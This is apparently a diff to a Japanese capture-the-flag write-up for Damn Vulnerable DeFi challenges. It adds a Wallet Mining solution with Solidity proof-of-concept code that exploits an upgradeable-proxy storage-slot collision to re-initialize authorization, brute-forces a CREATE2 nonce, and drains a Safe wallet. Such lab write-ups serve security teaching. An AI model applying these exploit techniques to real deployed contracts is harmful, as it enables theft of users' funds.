@@ -3,7 +3,7 @@ by tinamints
 
 ## 1. Unstoppable
 ### 条件 :
-- ヴォールトを停止させる
+- 金庫 (vault) を停止させる
 ### 概念 :
 -  フラッシュローン
 -  DoS攻撃
@@ -17,12 +17,12 @@ by tinamints
 
 ## 2. Naive Receiver
 ### 条件 :
-- プール内の全資金をリカバリーアカウントへ移す
+- プール内の全資金をリカバリーアカウント (recovery) へ移す
 - 2トランザクション以内で完了する
 ### 概念 :
 -  フラッシュローン
 ### 解法 :
-- receiverを対象に指定して手数料でETHを全額消費させ、feeReceiverになりすまして蓄積したWETHを引き出す
+- receiverを対象に指定して(フラッシュローンの)手数料によってETHを全額消費させ、feeReceiverになりすまして蓄積したWETHを引き出す
 ### POC
 ` function test_naiveReceiver() public checkSolvedByPlayer {
         bytes[] memory data = new bytes[](10);
@@ -225,5 +225,84 @@ by tinamints
             payable(address(vault)), payable(address(timelock)), recovery, address(token)
         );
         attackContract.attack(address(maliciousImpl));
+    }
+`
+
+## 13. Wallet Mining
+### 条件 :
+- ユーザーの入金アドレスにある2000万DVTを全額ユーザーへ回収し、wallet deployerの報酬をwardへ移動
+### 概念 :
+-  アップグレード可能プロキシ(proxy)のストレージスロット衝突（再初期化）
+-  CREATE2アドレスのマイニング
+### 解法 :
+- `AuthorizerUpgradeable`の`needsInit`はストレージスロット0にあり、プロキシの`upgrader`アドレス（常に非ゼロ）と衝突している。そのため誰でも`init()`を再度呼び出して自分自身を認可できる。`WalletDeployer.drop()`は選んだ`(wat, nonce)`の組がCREATE2で`USER_DEPOSIT_ADDRESS`にデプロイされるかどうかしかチェックしないので、一致するnonceが見つかるまでブルートフォースし、その場所に本物のSafe（ownerは`user`）をデプロイする。あとはユーザーの署名で`execTransaction`を使って引き出し、deployerの報酬を`ward`に転送する
+### POC
+`{
+     // 1. Get authorized
+        getAuthorized(authorizer);
+
+        // 2. Find the nonce
+        bytes memory setupCalldata = _buildSetup(user);
+        uint256 nonce = findNonce(walletDeployer, setupCalldata);
+
+        // 3. Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
+        //    and pays 1 DVT to this contract (msg.sender)
+        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);
+
+        // 4. Drain the Safe
+        _drainSafe(token, user, userPrivateKey);
+
+        // 5. Forward the reward
+        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
+    }
+
+    // 1. Slot 0 collision: needsInit reads the proxy's upgrader address (non-zero), so init()'s require passes again
+    function getAuthorized(address authorizer) internal {
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = USER_DEPOSIT_ADDRESS;
+        AuthorizerUpgradeable(authorizer).init(wards, aims);
+    }
+
+    function _buildSetup(address user) internal pure returns (bytes memory) {
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        return abi.encodeCall(
+            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
+        );
+    }
+
+    // 2. Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
+    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
+        WalletDeployer wd = WalletDeployer(walletDeployer);
+        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
+        bytes32 initializerHash = keccak256(setupCalldata);
+        address factory = address(wd.cook());
+        for (uint256 n = 0; n < 1000; n++) {
+            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n))
+            , initCodeHash)))));        
+                
+            if (predicted == USER_DEPOSIT_ADDRESS) {
+                console.log("found nonce:", n);
+                return n;
+            }
+        }
+        revert("nonce not found in 0..999");
+    }
+
+    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
+        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
+        bytes memory transferCalldata = abi.encodeCall(
+            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
+        );
+        bytes32 txHash = safe.getTransactionHash(
+            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
+        );
+        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
+        safe.execTransaction(
+            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
+            abi.encodePacked(r, s, v)
+        );
     }
 `
